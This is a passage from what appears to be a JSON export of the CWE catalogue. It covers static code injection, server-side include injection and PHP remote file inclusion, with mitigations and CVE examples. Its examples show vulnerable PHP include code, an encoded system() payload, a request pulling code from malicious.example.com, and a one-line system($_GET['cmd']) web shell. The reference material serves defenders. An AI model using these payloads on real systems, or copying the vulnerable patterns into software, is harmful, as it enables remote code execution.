administrators can run exports, but the privilege can be delegated to lower privileged users."}, {"Reference": "CVE-2022-36099", "Description": "XWiki Platform Wiki UI Main Wiki is software for managing subwikis on XWiki Platform, a generic wiki platform. Starting with version 5.3-milestone-2 and prior to versions 13.10.6 and 14.4, it's possible to inject arbitrary wiki syntax including Groovy, Python and Velocity script macros via the request (URL parameter) using the `XWikiServerClassSheet` if the user has view access to this sheet and another page that has been saved with programming rights, a standard condition on a public read-only XWiki installation or a private XWiki installation where the user has an account. This allows arbitrary Groovy/Python/Velocity code execution which allows bypassing all rights checks and thus both modification and disclosure of all content stored in the XWiki installation. Also, this could be used to impact the availability of the wiki. This has been patched in versions 13.10.6 and 14.4. As a workaround, edit the affected document `XWiki.XWikiServerClassSheet` or `WikiManager.XWikiServerClassSheet` and manually perform the changes from the patch fixing the issue. On XWiki versions 12.0 and later, it is also possible to import the document `XWiki.XWikiServerClassSheet` from the xwiki-platform-wiki-ui-mainwiki package version 14.4 using the import feature of the administration application as there have been no other changes to this document since XWiki 12.0."}, {"Reference": "CVE-2022-36100", "Description": "XWiki Platform Applications Tag and XWiki Platform Tag UI are tag applications for XWiki, a generic wiki platform. Starting with version 1.7 in XWiki Platform Applications Tag and prior to 13.10.6 and 14.4 in XWiki Platform Tag UI, the tags document `Main.Tags` in XWiki didn't sanitize user inputs properly. This allowed users with view rights on the document (default in a public wiki or for authenticated users on private wikis) to execute arbitrary Groovy, Python and Velocity code with programming rights. This also allowed bypassing all rights checks and thus both modification and disclosure of all content stored in the XWiki installation. The vulnerability could be used to impact the availability of the wiki. On XWiki versions before 13.10.4 and 14.2, this can be combined with CVE-2022-36092, meaning that no rights are required to perform the attack. The vulnerability has been patched in versions 13.10.6 and 14.4. As a workaround, the patch that fixes the issue can be manually applied to the document `Main.Tags` or the updated version of that document can be imported from version 14.4 of xwiki-platform-tag-ui using the import feature in the administration UI on XWiki 10.9 and later."}, {"Reference": "CVE-2022-38193", "Description": "There is a code injection vulnerability in Esri Portal for ArcGIS versions 10.8.1 and below that may allow a remote, unauthenticated attacker to pass strings which could potentially cause arbitrary code execution."}, {"Reference": "CVE-2022-46161", "Description": "pdfmake is an open source client/server side PDF printing in pure JavaScript. In versions up to and including 0.2.5 pdfmake contains an unsafe evaluation of user controlled input. Users of pdfmake are thus subject to arbitrary code execution in the context of the process running the pdfmake code. There are no known fixes for this issue. Users are advised to restrict access to trusted user input."}, {"Reference": "CVE-2022-46648", "Description": "ruby-git versions prior to v1.13.0 allows a remote authenticated attacker to execute an arbitrary ruby code by having a user to load a repository containing a specially crafted filename to the product. This vulnerability is different from CVE-2022-47318."}, {"Reference": "CVE-2021-40553", "Description": "piwigo 11.5.0 is affected by a remote code execution (RCE) vulnerability in the LocalFiles Editor."}, {"Reference": "CVE-2022-2054", "Description": "Code Injection in GitHub repository nuitka/nuitka prior to 0.9. "}, {"Reference": "CVE-2022-23881", "Description": "ZZZCMS zzzphp v2.1.0 was discovered to contain a remote command execution (RCE) vulnerability via danger_key() at zzz_template.php."}, {"Reference": "CVE-2022-45907", "Description": "In PyTorch before trunk/89695, torch.jit.annotations.parse_type_line can cause arbitrary code execution because eval is used unsafely."}, {"Reference": "CVE-2022-46333", "Description": "The admin user interface in Proofpoint Enterprise Protection (PPS/PoD) contains a command injection vulnerability that enables an admin to execute commands beyond their allowed scope. This affects all versions 8.19.0 and below. "}, {"Reference": "CVE-2022-48175", "Description": "Rukovoditel v3.2.1 was discovered to contain a remote code execution (RCE) vulnerability in the component /rukovoditel/index.php?module=dashboard/ajax_request."}]}
{"ID": "96", "Name": "Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before inserting the input into an executable resource, such as a library, configuration file, or template.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "94", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "PHP", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Perl", "Prevalence": "Undetermined"}, {"Type": "Language", "Class": "Interpreted", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}, {"Phase": "Implementation", "Note": "This issue is frequently found in PHP applications that allow users to set configuration variables that are stored within executable PHP files. Technically, this could also be performed in some compiled code (e.g., by byte-patching an executable), although it is highly unlikely."}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Files or Directories", "Read Application Data"], "Note": "The injected code could access restricted data / files."}, {"Scope": ["Access Control"], "Impact": ["Bypass Protection Mechanism"], "Note": "In some cases, injectable code controls authentication; this may lead to a remote vulnerability."}, {"Scope": ["Access Control"], "Impact": ["Gain Privileges or Assume Identity"], "Note": "Injected code can access resources that the attacker is directly prevented from accessing."}, {"Scope": ["Integrity", "Confidentiality", "Availability", "Other"], "Impact": ["Execute Unauthorized Code or Commands"], "Note": "Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code."}, {"Scope": ["Non-Repudiation"], "Impact": ["Hide Activities"], "Note": "Often the actions performed by injected control code are unlogged."}], "PotentialMitigations": [{"MitigationID": "MIT-5", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n"}, {"Phase": ["Implementation"], "Strategy": "Output Encoding", "Description": "Perform proper output validation and escaping to neutralize all code syntax from data written to code files."}], "DemonstrativeExamples": [{"ID": "DX-32", "Entries": [{"IntroText": "This example attempts to write user messages to a message file and allow users to view them."}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n\t$MessageFile = \"messages.out\";\n\tif ($_GET[\"action\"] == \"NewMessage\") {\n\t\t$name = $_GET[\"name\"];\n\t\t$message = $_GET[\"message\"];\n\t\t$handle = fopen($MessageFile, \"a+\");\n\t\tfwrite($handle, \"<b>$name</b> says '$message'<hr>\\n\");\n\t\tfclose($handle);\n\t\techo \"Message Saved!<p>\\n\";\n\t}\n\telse if ($_GET[\"action\"] == \"ViewMessages\") {\n\t\tinclude($MessageFile);\n\t}\n```"}, {"BodyText": "While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as:"}, {"Nature": "Attack", "ExampleCode": "```\n\tname=h4x0r\n\tmessage=%3C?php%20system(%22/bin/ls%20-l%22);?%3E\n```"}, {"BodyText": "which will decode to the following:"}, {"Nature": "Attack", "ExampleCode": "```\n\t<?php system(\"/bin/ls -l\");?>\n```"}, {"BodyText": "The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages."}, {"BodyText": "Notice that XSS (CWE-79) is also possible in this situation."}]}], "ObservedExamples": [{"Reference": "CVE-2002-0495", "Description": "Perl code directly injected into CGI library file from parameters to another CGI program.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0495"}, {"Reference": "CVE-2005-1876", "Description": "Direct PHP code injection into supporting template file.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1876"}, {"Reference": "CVE-2005-1894", "Description": "Direct code injection into PHP script that can be accessed by attacker.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1894"}, {"Reference": "CVE-2003-0395", "Description": "PHP code from User-Agent HTTP header directly inserted into log file implemented as PHP script.", "Link": "https://www.cve.org/CVERecord?id=CVE-2003-0395"}, {"Reference": "CVE-2007-6652", "Description": "chain: execution after redirect allows non-administrator to perform static code injection.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6652"}], "AffectedResources": ["File or Directory"], "RelatedAttackPatterns": ["35", "73", "77", "81", "85"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "\"HTML injection\" (see CWE-79: XSS) could be thought of as an example of this, but the code is injected and executed on the client side, not the server side. Server-Side Includes (SSI) are an example of direct static code injection."}], "Top25Examples": [{"Reference": "CVE-2021-40870", "Description": "An issue was discovered in Aviatrix Controller 6.x before 6.5-1804.1922. Unrestricted upload of a file with a dangerous type is possible, which allows an unauthenticated user to execute arbitrary code via directory traversal."}, {"Reference": "CVE-2022-26982", "Description": "SimpleMachinesForum 2.1.1 and earlier allows remote authenticated administrators to execute arbitrary code by inserting a vulnerable php code because the themes can be modified by an administrator. NOTE: the vendor's position is that administrators are intended to have the ability to modify themes, and can thus choose any PHP code that they wish to have executed on the server."}, {"Reference": "CVE-2021-24890", "Description": "The Scripts Organizer WordPress plugin before 3.0 does not have capability and CSRF checks in the saveScript AJAX action, available to both unauthenticated and authenticated users, and does not validate user input in any way, which could allow unauthenticated users to put arbitrary PHP code in a file"}, {"Reference": "CVE-2021-36424", "Description": "An issue discovered in phpwcms 1.9.25 allows remote attackers to run arbitrary code via DB user field during installation."}, {"Reference": "CVE-2021-39426", "Description": "An issue was discovered in /Upload/admin/admin_notify.php in Seacms 11.4 allows attackers to execute arbitrary php code via the notify1 parameter when the action parameter equals set."}, {"Reference": "CVE-2022-2354", "Description": "The WP-DBManager WordPress plugin before 2.80.8 does not prevent administrators from running arbitrary commands on the server in multisite installations, where only super-administrators should."}, {"Reference": "CVE-2022-24664", "Description": "PHP Everywhere <= 2.0.3 included functionality that allowed execution of PHP Code Snippets via WordPress metaboxes, which could be used by any user able to edit posts."}, {"Reference": "CVE-2022-24665", "Description": "PHP Everywhere <= 2.0.3 included functionality that allowed execution of PHP Code Snippets via a WordPress gutenberg block by any user able to edit posts."}, {"Reference": "CVE-2022-25018", "Description": "Pluxml v5.8.7 was discovered to allow attackers to execute arbitrary code via crafted PHP code inserted into static pages."}, {"Reference": "CVE-2022-25578", "Description": "taocms v3.0.2 allows attackers to execute code injection via arbitrarily editing the .htaccess file."}, {"Reference": "CVE-2022-25812", "Description": "The Transposh WordPress Translation WordPress plugin before 1.0.8 does not validate its debug settings, which could allow allowing high privilege users such as admin to perform RCE"}, {"Reference": "CVE-2022-26272", "Description": "A remote code execution (RCE) vulnerability in Ionize v1.0.8.1 allows attackers to execute arbitrary code via a crafted string written to the file application/config/config.php."}, {"Reference": "CVE-2022-28096", "Description": "Skycaiji v2.4 was discovered to contain a remote code execution (RCE) vulnerability via /SkycaijiApp/admin/controller/Develop.php."}, {"Reference": "CVE-2022-35516", "Description": "DedeCMS v5.7.93 - v5.7.96 was discovered to contain a remote code execution vulnerability in login.php."}, {"Reference": "CVE-2022-36215", "Description": "DedeBIZ v6 was discovered to contain a remote code execution vulnerability in sys_info.php."}, {"Reference": "CVE-2022-36216", "Description": "DedeCMS v5.7.94 - v5.7.97 was discovered to contain a remote code execution vulnerability in member_toadmin.php."}, {"Reference": "CVE-2022-46836", "Description": "PHP code injection in watolib auth.php and hosttags.php in Tribe29's Checkmk <= 2.1.0p10, Checkmk <= 2.0.0p27, and Checkmk <= 1.6.0p29 allows an attacker to inject and execute PHP code which will be executed upon request of the vulnerable component."}, {"Reference": "CVE-2022-48093", "Description": "Seacms v12.7 was discovered to contain a remote code execution (RCE) vulnerability via the ip parameter at admin_ ip.php."}, {"Reference": "CVE-2022-36756", "Description": "DIR845L A1 v1.00-v1.03 is vulnerable to command injection via /htdocs/upnpinc/gena.php."}, {"Reference": "CVE-2022-37053", "Description": "TRENDnet TEW733GR v1.03B01 is vulnerable to Command injection via /htdocs/upnpinc/gena.php."}, {"Reference": "CVE-2022-36262", "Description": "An issue was discovered in taocms 3.0.2. in the website settings that allows arbitrary php code to be injected by modifying config.php."}, {"Reference": "CVE-2021-41402", "Description": "flatCore-CMS v2.0.8 has a code execution vulnerability, which could let a remote malicious user execute arbitrary PHP code."}, {"Reference": "CVE-2021-24209", "Description": "The WP Super Cache WordPress plugin before 1.7.2 was affected by an authenticated (admin+) RCE in the settings page due to input validation failure and weak $cache_path check in the WP Super Cache Settings -> Cache Location option. Direct access to the wp-cache-config.php file is not prohibited, so this vulnerability can be exploited for a web shell injection."}, {"Reference": "CVE-2022-2636", "Description": "Improper Control of Generation of Code ('Code Injection') in GitHub repository hestiacp/hestiacp prior to 1.6.6. "}, {"Reference": "CVE-2022-25498", "Description": "CuppaCMS v1.0 was discovered to contain a remote code execution (RCE) vulnerability via the saveConfigData function in /classes/ajax/Functions.php."}]}
{"ID": "97", "Name": "Improper Neutralization of Server-Side Includes (SSI) Within a Web Page", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product generates a web page, but does not neutralize or incorrectly neutralizes user-controllable input that could be interpreted as a server-side include (SSI) directive.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "96", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"]}], "RelatedAttackPatterns": ["101", "35"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "This can be resultant from XSS/HTML injection because the same special characters can be involved. However, this is server-side code execution, not client-side."}], "Top25Examples": [{"Reference": "CVE-2022-43660", "Description": "Improper neutralization of Server-Side Includes (SSW) within a web page in Movable Type series allows a remote authenticated attacker with Privilege of 'Manage of Content Types' may execute an arbitrary Perl script and/or an arbitrary OS command. Affected products/versions are as follows: Movable Type 7 r.5301 and earlier (Movable Type 7 Series), Movable Type Advanced 7 r.5301 and earlier (Movable Type Advanced 7 Series), Movable Type Premium 1.53 and earlier, and Movable Type Premium Advanced 1.53 and earlier."}]}
{"ID": "98", "Name": "Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in \"require,\" \"include,\" or similar functions.", "ExtendedDescription": "In certain versions and configurations of PHP, this can allow an attacker to specify a URL to a remote location from which the product will obtain the code to execute. In other cases in association with path traversal, the attacker can specify a local file that may contain executable statements that can be parsed by PHP.", "LikelihoodOfExploit": "High", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "706", "ViewID": "1000"}, {"Nature": "ChildOf", "CweID": "829", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "94", "ViewID": "1000"}, {"Nature": "CanAlsoBe", "CweID": "426", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "PHP", "Prevalence": "Often"}], "AlternateTerms": [{"Term": "Remote file include"}, {"Term": "RFI", "Description": "The Remote File Inclusion (RFI) acronym is often used by vulnerability researchers."}, {"Term": "Local file inclusion", "Description": "This term is frequently used in cases in which remote download is disabled, or when the first part of the filename is not under the attacker's control, which forces use of relative path traversal (CWE-23) attack techniques to access files that may contain previously-injected PHP code, such as web access logs."}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Integrity", "Confidentiality", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"], "Note": "The attacker may be able to specify arbitrary code to be executed from a remote location. Alternatively, it may be possible to use normal program behavior to insert php code into files on the local machine which can then be included and force the code to execute since php ignores everything in the file except for the content between php specifiers."}], "DetectionMethods": [{"Method": "Manual Analysis", "Description": "Manual white-box analysis can be very effective for finding this issue, since there is typically a relatively small number of include or require statements in each program.", "Effectiveness": "High"}, {"Method": "Automated Static Analysis", "Description": "\n\nThe external control or influence of filenames can often be detected using automated static analysis that models data flow within the product.\n\n\nAutomated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes. If the program uses a customized input validation library, then some tools may allow the analyst to create custom signatures to detect usage of those routines.\n"}], "PotentialMitigations": [{"MitigationID": "MIT-4", "Phase": ["Architecture and Design"], "Strategy": "Libraries or Frameworks", "Description": "Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid."}, {"MitigationID": "MIT-21.1", "Phase": ["Architecture and Design"], "Strategy": "Enforcement by Conversion", "Description": "\n\nWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.\n\n\nFor example, ID 1 could map to \"inbox.txt\" and ID 2 could map to \"profile.txt\". Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.\n"}, {"MitigationID": "MIT-15", "Phase": ["Architecture and Design"], "Description": "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."}, {"MitigationID": "MIT-22", "Phase": ["Architecture and Design", "Operation"], "Strategy": "Sandbox or Jail", "Description": "\n\nRun the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.\n\n\nOS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.\n\n\nThis may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.\n\n\nBe careful to avoid CWE-243 and other weaknesses related to jails.\n", "Effectiveness": "Limited", "EffectivenessNotes": "The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."}, {"MitigationID": "MIT-17", "Phase": ["Architecture and Design", "Operation"], "Strategy": "Environment Hardening", "Description": "Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."}, {"MitigationID": "MIT-5.1", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n\n\nWhen validating filenames, use stringent lists that limit the character set to be used. If feasible, only allow a single \".\" character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as \"/\" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.\n\n\nDo not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering \"/\" is insufficient protection if the filesystem also supports the use of \"\\\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if \"../\" sequences are removed from the \".../...//\" string in a sequential fashion, two instances of \"../\" would be removed from the original string, but the remaining characters would still form the \"../\" string.\n", "Effectiveness": "High"}, {"MitigationID": "MIT-34", "Phase": ["Architecture and Design", "Operation"], "Strategy": "Attack Surface Reduction", "Description": "\n\nStore library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.\n\n\nThis significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.\n"}, {"MitigationID": "MIT-6", "Phase": ["Architecture and Design", "Implementation"], "Strategy": "Attack Surface Reduction", "Description": "\n\nUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.\n\n\nMany file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.\n"}, {"MitigationID": "MIT-29", "Phase": ["Operation"], "Strategy": "Firewall", "Description": "Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.", "Effectiveness": "Moderate", "EffectivenessNotes": "An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."}, {"Phase": ["Operation", "Implementation"], "Strategy": "Environment Hardening", "Description": "Develop and run your code in the most recent versions of PHP available, preferably PHP 6 or later. Many of the highly risky features in earlier PHP interpreters have been removed, restricted, or disabled by default."}, {"MitigationID": "MIT-16", "Phase": ["Operation", "Implementation"], "Strategy": "Environment Hardening", "Description": "\n\nWhen using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.\n\n\nOften, programmers do not protect direct access to files intended only to be included by core programs. These include files may assume that critical variables have already been initialized by the calling program. As a result, the use of register_globals combined with the ability to directly access the include file may allow attackers to conduct file inclusion attacks. This remains an extremely common pattern as of 2009.\n"}, {"Phase": ["Operation"], "Strategy": "Environment Hardening", "Description": "Set allow_url_fopen to false, which limits the ability to include files from remote locations.", "Effectiveness": "High", "EffectivenessNotes": "Be aware that some versions of PHP will still accept ftp:// and other URI schemes. In addition, this setting does not protect the code from path traversal attacks (CWE-22), which are frequently successful against the same vulnerable code that allows remote file inclusion."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following code, victim.php, attempts to include a function contained in a separate PHP page on the server. It builds the path to the file by using the supplied 'module_name' parameter and appending the string '/function.php' to it."}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n\t$dir = $_GET['module_name'];\n\tinclude($dir . \"/function.php\");\n```"}, {"BodyText": "The problem with the above code is that the value of $dir is not restricted in any way, and a malicious user could manipulate the 'module_name' parameter to force inclusion of an unanticipated file. For example, an attacker could request the above PHP page (example.php) with a 'module_name' of \"http://malicious.example.com\" by using the following request string:"}, {"Nature": "Attack", "ExampleCode": "```\n\tvictim.php?module_name=http://malicious.example.com\n```"}, {"BodyText": "Upon receiving this request, the code would set 'module_name' to the value \"http://malicious.example.com\" and would attempt to include http://malicious.example.com/function.php, along with any malicious code it contains."}, {"BodyText": "For the sake of this example, assume that the malicious version of function.php looks like the following:"}, {"Nature": "Bad", "ExampleCode": "```\n\tsystem($_GET['cmd']);\n```"}, {"BodyText": "An attacker could now go a step further in our example and provide a request string as follows:"}, {"Nature": "Attack", "ExampleCode": "```\n\tvictim.php?module_name=http://malicious.example.com&cmd=/bin/ls%20-l\n```"}, {"BodyText": "The code will attempt to include the malicious function.php file from the remote site. In turn, this file executes the command specified in the 'cmd' parameter from the query string. The end result is an attempt by tvictim.php to execute the potentially malicious command, in this case:"}, {"Nature": "Attack", "ExampleCode": "```\n\t/bin/ls -l\n```"}, {"BodyText": "Note that the above PHP example can be mitigated by setting allow_url_fopen to false, although this will not fully protect the code. See potential mitigations."}]}], "ObservedExamples": [{"Reference": "CVE-2004-0285", "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0285"}, {"Reference": "CVE-2004-0030", "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0030"}, {"Reference": "CVE-2004-0068", "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0068"}, {"Reference": "CVE-2005-2157", "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2157"}, {"Reference": "CVE-2005-2162", "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2162"}, {"Reference": "CVE-2005-2198", "Description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2198"}, {"Reference": "CVE-2004-0128", "Description": "Modification of assumed-immutable variable in configuration script leads to file inclusion.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0128"}, {"Reference": "CVE-2005-1864", "Description": "PHP file inclusion.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1864"}, {"Reference": "CVE-2005-1869", "Description": "PHP file inclusion.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1869"}, {"Reference": "CVE-2005-1870", "Description": "PHP file inclusion.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1870"}, {"Reference": "CVE-2005-2154", "Description": "PHP local file inclusion.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2154"}, {"Reference": "CVE-2002-1704", "Description": "PHP remote file include.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1704"}, {"Reference": "CVE-2002-1707", "Description": "PHP remote file include.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1707"}, {"Reference": "CVE-2005-1964", "Description": "PHP remote file include.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1964"}, {"Reference": "CVE-2005-1681", "Description": "PHP remote file include.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1681"}, {"Reference": "CVE-2005-2086", "Description": "PHP remote file include.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2086"}, {"Reference": "CVE-2004-0127", "Description": "Directory traversal vulnerability in PHP include statement.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0127"}, {"Reference": "CVE-2005-1971", "Description": "Directory traversal vulnerability in PHP include statement.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1971"}, {"Reference": "CVE-2005-3335", "Description": "PHP file inclusion issue, both remote and local; local include uses \"..\" and \"%00\" characters as a manipulation, but many remote file inclusion issues probably have this vector.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3335"}, {"Reference": "CVE-2009-1936", "Description": "chain: library file sends a redirect if it is directly requested but continues to execute, allowing remote file inclusion and path traversal.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1936"}], "AffectedResources": ["File or Directory"], "RelatedAttackPatterns": ["193"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "\n\nThis is frequently a functional consequence of other weaknesses. It is usually multi-factor with other factors (e.g. MAID), although not all inclusion bugs involve assumed-immutable data. Direct request weaknesses frequently play a role.\n\n\nCan overlap directory traversal in local inclusion problems.\n"}], "Top25Examples": [{"Reference": "CVE-2022-22308", "Description": "IBM Planning Analytics 2.0 is vulnerable to a Remote File Include (RFI) attack. User input could be passed into file include commands and the web application could be tricked into including remote files with malicious code. IBM X-Force ID: 216891."}]}
